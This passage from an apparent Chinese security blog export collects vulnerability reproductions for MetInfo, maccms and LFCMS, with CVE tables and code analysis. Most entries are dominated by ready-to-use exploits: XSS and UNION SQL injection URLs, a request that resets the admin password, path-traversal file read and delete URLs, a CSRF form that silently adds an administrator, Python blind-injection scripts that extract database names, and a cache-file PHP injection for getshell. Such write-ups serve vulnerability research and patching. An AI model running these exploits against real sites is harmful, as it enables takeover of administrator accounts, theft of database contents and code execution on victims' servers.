class="line">http://xxx.com/admin/update/12313/sqlist.php</span><br></pre></td></tr></table></figure><h2 id="0x05小结"><a href="#0x05小结" class="headerlink" title="0x05小结"></a>0x05小结</h2><p>都是需要后台管理员权限才能利用的漏洞，不过危害还是比较大，没有升级的网站赶紧升级6.0版本哦！<br>前几个都有一定的条件要求，后面两个比较通杀!</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/Metinfo-6.1.2%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E&amp;SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/Metinfo-6.1.2%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E&amp;SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>Metinfo-6.1.2版本存在XSS漏洞&amp;SQL注入漏洞</td><td>2018-10-12</td><td>踏月留香</td><td><a href="https://www.metinfo.cn/" target="_blank" rel="noopener">https://www.metinfo.cn/</a></td><td><a href="https://www.metinfo.cn/upload/file/MetInfo6.1.2.zip" target="_blank" rel="noopener">下载地址</a></td><td>6.1.2</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18296" target="_blank" rel="noopener">CVE-2018-18296</a>/<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17129" target="_blank" rel="noopener">CVE-2018-17129</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>漏洞存在于MetInfo6.1.2/admin/index.php页面，由于参数bigclass过滤不严，导致XSS漏洞<br>本地搭建网站，首先登录网站后台:<code>http://172.16.141.134/MetInfo6.1.2/admin/</code>，登录成功后，构造payload：<br><code>http://172.16.141.134/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=25&amp;n=column&amp;c=index&amp;a=doadd&amp;bigclass=1%22%3e%3cscript%3ealert(/xss/)%3c%2fscript%3e</code> ，即可执行跨站脚本。  </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>XSS漏洞的 exp代码如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=25&amp;n=column&amp;c=index&amp;a=doadd&amp;bigclass=1%22%3e%3cscript%3ealert(/xss/)%3c%2fscript%3e</span><br></pre></td></tr></table></figure><blockquote><p>SQL注入漏洞的 exp代码如下：<br>漏洞存在于MetInfo6.1.2 <code>/app/system/feedback/admin/feedback_admin.class.php</code>页面中，由于该页面的class1参数过滤不严，导致存在SQL注入漏洞。<br>本地搭建网站，首先登录网站后台:<code>http://172.16.141.134/MetInfo6.1.2/admin/</code>，登录成功后，构造payload：<br><code>http://172.16.141.134/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=29&amp;n=feedback&amp;c=feedback_admin&amp;a=doexport&amp;class1=-1//union//select//concat(0x3a,user(),0x3a)//from/**/information_schema.tables&amp;met_fd_export=-1</code>，访问后网站会导出一个excel表，excel表的名称为数据库用户名。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=29&amp;n=feedback&amp;c=feedback_admin&amp;a=doexport&amp;class1=-1/**/union/**/select/**/concat(0x3a,user(),0x3a)/**/from/**/information_schema.tables&amp;met_fd_export=-1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfo%20V5.1.7%20getshell/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfo%20V5.1.7%20getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="metinfo多个漏洞"><a href="#metinfo多个漏洞" class="headerlink" title="metinfo多个漏洞"></a>metinfo多个漏洞</h1><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p><strong>版本：MetInfo V5.1.7  2013年5月23</strong>    </p><p><strong><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2013-043795.html" target="_blank" rel="noopener">metinfo多个漏洞(可getshell)  </a></strong></p><p>审计一般先看核心文件。</p><p><code>\include\common.inc.php</code> 中的21-28行</p><pre><code>define(&apos;MAGIC_QUOTES_GPC&apos;, get_magic_quotes_gpc());isset($_REQUEST[&apos;GLOBALS&apos;]) &amp;&amp; exit(&apos;Access Error&apos;);require_once ROOTPATH.&apos;include/global.func.php&apos;;foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) {    foreach($$_request as $_key =&gt; $_value) {        $_key{0} != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value);    }}</code></pre><p>大概从21行程序开始使用了伪<code>register_globals</code>机制。</p><p>2： 变量未初始化及extract函数使用不当。</p><p>在<code>common.inc.php</code>文件随后的代码里包含了一个<code>config.inc.php</code>的文件, 看名字就知道是一些初始化变量配置, 程序员将应用程序所需变量</p><p>放在了<code>register_globals</code>机制之后声明估计就是怕变量被覆盖.但是<code>config.inc.php</code>的一个数组<code>$settings</code>却忘记了初始化.</p><pre><code>/*读配置数据*/$query = &quot;SELECT * FROM $met_config WHERE lang=&apos;$lang&apos; or lang=&apos;metinfo&apos;&quot;;$result = $db-&gt;query($query);while($list_config= $db-&gt;fetch_array($result)){    if($metinfoadminok)$list_config[&apos;value&apos;]=str_replace(&apos;&quot;&apos;, &apos;&amp;#34;&apos;, str_replace(&quot;&apos;&quot;, &apos;&amp;#39;&apos;,$list_config[&apos;value&apos;]));    $settings_arr[]=$list_config;    if($list_config[&apos;columnid&apos;]){        $settings[$list_config[&apos;name&apos;].&apos;_&apos;.$list_config[&apos;columnid&apos;]]=$list_config[&apos;value&apos;];    }else{        $settings[$list_config[&apos;name&apos;]]=$list_config[&apos;value&apos;];    }    if($list_config[&apos;flashid&apos;]){        $list_config[&apos;value&apos;]=explode(&apos;|&apos;,$list_config[&apos;value&apos;]);        $falshval[&apos;type&apos;]=$list_config[&apos;value&apos;][0];        $falshval[&apos;x&apos;]=$list_config[&apos;value&apos;][1];        $falshval[&apos;y&apos;]=$list_config[&apos;value&apos;][2];        $falshval[&apos;imgtype&apos;]=$list_config[&apos;value&apos;][3];        $met_flasharray[$list_config[&apos;flashid&apos;]]=$falshval;    }}@extract($settings);</code></pre><blockquote><p>在没有初始化的情况下又使用了extract($settings),结合前面的register_globals机制这样就导致多个变量可以被覆盖掉从而控制整个程序逻辑.</p></blockquote><p>3:sql注入绕过</p><pre><code>前面的防注入函数里可以看到替换了一些常用的关键字，使注入的难度增加了，但那仅仅只对sql语句的where之后注入有所防范。对于可以覆盖系统变量的咋们来讲就不太管用了而且无视GPC，sql注释符也没有过滤。为了降低攻击成本我挑了一处最容易实现攻击地方，一个update的sql语句。在 include\hits.php的25行左右。$query = &quot;update $met_hits SET hits=&apos;$hits_list[hits]&apos; where id=&apos;$id&apos;&quot;;覆盖掉$met_hits变量就可以update任何数据表，如修改管理员密码。hits.php?type=img&amp;settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23使用密码1登陆后台拿shell，再把管理员密码改回来。hits.php?type=img&amp;settings[met_img]=met_admin_table+SET+admin_pass=admin_introduction+WHERE+id=1%23</code></pre><p>修改密码</p><pre><code>http://192.168.86.194:9000/MetInfo517/include/hits.php?type=img&amp;settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23</code></pre><p>将密码修改为 1</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2013-043795.html" target="_blank" rel="noopener">metinfo多个漏洞(可getshell) –wooyun-2013-043795 </a></p><p><a href="https://tournasdimitrios1.wordpress.com/2010/11/09/what-is-register_globals-and-why-is-it-a-security-risk/" target="_blank" rel="noopener">What is register_globals and why is it a security risk?</a></p><p><a href="https://www.mediawiki.org/wiki/Register_globals" target="_blank" rel="noopener">register_globals</a></p><p><a href="https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html" target="_blank" rel="noopener">PHP Backdoors: Hidden With Clever Use of Extract Function</a></p><p><a href="https://davidnoren.com/post/php-extract-vulnerability.html" target="_blank" rel="noopener">PHP extract() Vulnerability</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4&amp;%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/methifo6.0.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4&amp;%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p> <strong>Metinfo 6.0.0</strong></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="1-CMS安装的时候，比如数据库名字会被直接写进配置文件中。"><a href="#1-CMS安装的时候，比如数据库名字会被直接写进配置文件中。" class="headerlink" title="1 CMS安装的时候，比如数据库名字会被直接写进配置文件中。"></a>1 CMS安装的时候，比如数据库名字会被直接写进配置文件中。</h3><h3 id="2-任意删除"><a href="#2-任意删除" class="headerlink" title="2 任意删除"></a>2 任意删除</h3><p>好像需要登陆后，才能执行成功。 admin目录下。</p><pre><code>192.168.0.4/metinfo600/admin/app/batch/csvup.php?fileField=test-1&amp;flienamecsv=../../../config/test.txt</code></pre><h3 id="3-任意文件读取"><a href="#3-任意文件读取" class="headerlink" title="3  任意文件读取"></a>3  任意文件读取</h3><pre><code>metinfo600/include/thumb.php?dir=http\..\..\config\config_db.php</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.anquanke.com/post/id/154149" target="_blank" rel="noopener">Metinfo 6.0.0 众多漏洞分析</a></p><p><a href="https://paper.seebug.org/676/" target="_blank" rel="noopener"> MetInfo 任意文件读取漏洞的修复与绕过</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/macCMS/maccms_v10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/macCMS/maccms_v10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>maccms_v10存在CSRF漏洞可增加任意账号</td><td>2018-06-11</td><td>Bay0net</td><td><a href="http://www.maccms.com/" target="_blank" rel="noopener">http://www.maccms.com/</a></td><td><a href="http://www.maccms.com/down.html" target="_blank" rel="noopener">http://www.maccms.com/down.html</a></td><td>v10</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12114" target="_blank" rel="noopener">CVE-2018-12114</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>恶意攻击者可以精心伪造一个Html页面添加管理员账户对网站进行入侵。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>exp代码如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>history.pushState('', '', '/')<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://10.211.55.17/maccms10/admin.php/admin/admin/info.html"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"admin_id"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"admin_name"</span> <span class="attr">value</span>=<span class="string">"test2"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"admin_pwd"</span> <span class="attr">value</span>=<span class="string">"test2"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"admin_status"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"admin_auth[0]"</span> <span class="attr">value</span>=<span class="string">"index/welcome"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><h3 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h3><p>该漏洞可以利用的原因一是在于后台对于站点配置数据没有做好过滤，二是利用了tp3.2版本下本身存在的缓存漏洞，漏洞起始利用点位于/Application/Admin/Controller/ConfigController.class.php中的save方法，代码如下<br><img src="后台getshell/SPGyoi74FA8qK3t.png" alt></p><p>该处将后台设置的配置项直接存储在数据库中，接着当用户访问站点前台页面时，会调用/Application/Home/Controller/HomeController.class.php中的_initialize方法，部分代码如图<br><img src="后台getshell/niKJ7hzDesFkyB5.png" alt><br>当第一次访问时，会调用第二十一行的缓存函数写缓存文件，在这里如果在设置配置数据的时候写入恶意的PHP代码，就可以在缓存文件中写入我们想要执行的代码，进而getshell，首先我们来到后台用户配置设置处<br><img src="后台getshell/oZmuTM5JI8jRc1l.png" alt><br>提交数据抓取数据包，在其中一个设置项中填入php代码，由于缓存文件对于配置项进行了注释，为了逃逸注释我们需要另起一行写入PHP代码并将后面的无用数据注释掉，如图<br><img src="后台getshell/tsqPO1HfpUGFLWn.png" alt><br>然后访问前台页面生成缓存文件，缓存文件在/Application/Runtime/Temp/目录下，文件名为缓存数据名称的MD5值，在这里也就是DB_CONFIG_DATA的MD5值，我们直接访问缓存文件</p><pre><code>http://lfcms.com/Application/Runtime/Temp/95a1fe934b68ebfee8468bf0bc4f0000.php</code></pre><p><img src="后台getshell/FCftG7MaRoTes5j.png" alt><br>成功的写入了PHP代码</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7844#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7844#toc-4</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><h3 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h3><p>漏洞起始点位于/Application/Home/Controller/AjaxController.class.php文件中的randMovie方法，代码如下<br><img src="前台sql注入(二" alt>/FwpPtNe9ksYqGHL.png)<br>第七行代码中调用了Ajax模型中的randMovie方法，同时limit和category是我们输入的可控的参数，跟进randMovie方法</p><pre><code>public function randMovie($limit=6,$category=&apos;&apos;) {if($category) {$type=&apos;and category=&apos;.$category;}$prefix=C(&apos;DB_PREFIX&apos;);$mlist=M()-&gt;query(&apos;SELECT * FROM `&apos;.$prefix.&apos;movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `&apos;.$prefix.&apos;movie`)-(SELECT MIN(id) FROM `&apos;.$prefix.&apos;movie`))+(SELECT MIN(id) FROM `&apos;.$prefix.&apos;movie`)) AS idx) AS t2 WHERE t1.id &gt;= t2.idx &apos;.$type.&apos; ORDER BY t1.id LIMIT &apos;.$limit);foreach($mlist as $key=&gt;$value) {$list[$key]=D(&apos;Tag&apos;)-&gt;movieChange($value,&apos;movie&apos;);}return $list;}</code></pre><p>在这里注意到$type与$limit在sql语句执行时均没有被单引号包裹，直接拼接到语句当中，这里就存在了sql注入的可能，首先我们在movie表里放一条数据，看一下正常执行时sql语句是如何执行的<br><img src="前台sql注入(二" alt>/l8EqK7Y4kmdeNCi.png)<br>查看数据库日志可以得到如下sql语句</p><pre><code>SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id &gt;= t2.idx and category=2 ORDER BY t1.id LIMIT 1</code></pre><p>接着来尝试下进行注入，测试链接如下</p><pre><code>http://lfcms.com/index.php/Ajax/randMovie?limit=1&amp;category=2 and sleep(5)</code></pre><p>页面确实延迟了5秒，那么接着看一下后端数据库的语句</p><pre><code>SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id &gt;= t2.idx and category=2 and sleep(5) ORDER BY t1.id LIMIT 1</code></pre><p>基本可以判断该处存在着可用的注入点，接下来编写脚本跑一下数据库用户名试试</p><pre><code>import requestsurl = &apos;http://lfcms.com/index.php/Ajax/randMovie?limit=1&amp;category=2 and &apos;s = requests.session()result = &quot;&quot;for i in range(1,50):print(&apos;==========================&apos;)for j in range(32,127):payload = &quot;if((ascii(substr((select user()),{},1))={}),sleep(5),0)&quot;.format(i,j)temp = url+payloadtry:s.get(temp,timeout=5)except:result+= chr(j)print(result)break</code></pre><p><img src="前台sql注入(二" alt>/VQSIWXDlLHmZu2A.png)</p><p>相同原理的利用点同样不止一个，如/Application/Home/Controller/PlayerController.class.php文件中的down方法调用了模型movie中的getPlayerUrl方法，该方法的pid参数同样可以注入</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7844" target="_blank" rel="noopener">https://xz.aliyun.com/t/7844</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><h3 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h3><p>漏洞起始点位于/Application/Home/Controller/NewsController.class.php中的index方法，代码如下<br><img src="前台sql注入(一" alt>/TzJ74lFNKmtjurv.png)<br>在代码第六行调用了News模型中的detail方法，跟进该方法<br><img src="前台sql注入(一" alt>/kMGtey315nKcY9f.png)<br>可以看到在第八行进而调用了tp的find方法，在该版本中find方法是可以进行注入的，同时参数$id是我们可控的，首先我们来看一下正常的输入情况(图中域名为本地搭建解析)<br><img src="前台sql注入(一" alt>/FQqP2YrzCc6inag.png)</p><p>根据tp3.2的注入点构造一下语句，访问如下链接</p><pre><code>http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and 1--</code></pre><p>页面与正常访问相比没有变化，查看一下数据库日志，看下后端数据库语句<br><img src="前台sql注入(一" alt>/OuVPDIbdgk7Zfja.png)</p><p>可以看到在id处已经可以进行sql语句的拼接，也就证明该处是存在可利用的注入点的，由于本套程序对于错误信息是有屏蔽的，在这里我们很难利用报错注入带出数据，在该处可以考虑使用布尔类型的盲注，两种回显状态如下<br><img src="前台sql注入(一" alt>/J8eYIvElUjLXsku.png)<br><img src="前台sql注入(一" alt>/OVqDUbNIlydY3w7.png)<br>接着写一下脚本（以查询数据库名为例）</p><pre><code>import requestsurl = &apos;http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and &apos;result = &apos;&apos;for i in range(1,50):print(&apos;-----------------------------&apos;)for j in range(32,127):payload = &apos;if((ascii(substr((select database()),{},1))={}),1,0)--&apos;.format(i,j)temp = url+payloadtry:html = requests.get(temp,timeout=10)if &apos;tttest&apos; in html.text:result+=chr(j)print(result)breakexcept:print(&apos;[-]error&apos;)</code></pre><p>结果如下<br><img src="前台sql注入(一" alt>/vRt2Zxjw4N3ubl7.png)<br>相同原理的利用点还有很多，如位于/Application/Home/Controller/MovieController.class.php中的index方法的id参数，这里就不再重复分析了</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7844" target="_blank" rel="noopener">https://xz.aliyun.com/t/7844</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><h3 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h3><p>漏洞起始点位于/Application/Admin/Controller/TemplateController.class.php中的edit方法，该方法用作后台模板编辑，关键代码如下<br><img src="任意文件读取/SHJ3QWdlhwmORiG.png" alt></p><p>我们传入的路径需要将/替换为*接着调用了read方法，跟进该方法</p><pre><code>public function read($filename,$type=&apos;&apos;){  return $this-&gt;get($filename,&apos;content&apos;,$type);}</code></pre><p>继续跟进get方法</p><pre><code>public function get($filename,$name,$type=&apos;&apos;) {if(!isset($this-&gt;contents[$filename])) {if(!is_file($filename)) return false;$this-&gt;contents[$filename]=file_get_contents($filename);}$content=$this-&gt;contents[$filename];$info   =   array(&apos;mtime&apos; =&gt;  filemtime($filename),&apos;content&apos;   =&gt;  $content);return $info[$name];}}</code></pre><p>该方法中返回了要读取的文件内容，可以看到在整个流程中没有对传入参数path的过滤，导致我们可以跨目录读文件，下面来验证一下，尝试读取一下跟目录index.php文件，测试链接如下</p><pre><code>http://lfcms.com/admin.php?s=/Template/edit/path/*..*index.php</code></pre><p><img src="任意文件读取/6HB9uAgiToOfcSM.png" alt><br>成功的读到了CMS的入口文件</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7844#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7844#toc-4</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%203.7.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%88%96%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%203.7.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%88%96%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>LFCMS 3.7.0存在CSRF漏洞可添加任意用户账户或任意管理员账户</td><td>2018-06-20</td><td>Bay0net</td><td><a href="http://www.lfdycms.com/" target="_blank" rel="noopener">http://www.lfdycms.com/</a></td><td><a href="http://www.lfdycms.com/" target="_blank" rel="noopener">http://www.lfdycms.com/</a></td><td>3.7.0</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12602" target="_blank" rel="noopener">CVE-2018-12602</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>攻击者可通过构造 CSRF 请求，来新增任意用户。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>通过CSRF增加任意用户 的exp代码如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 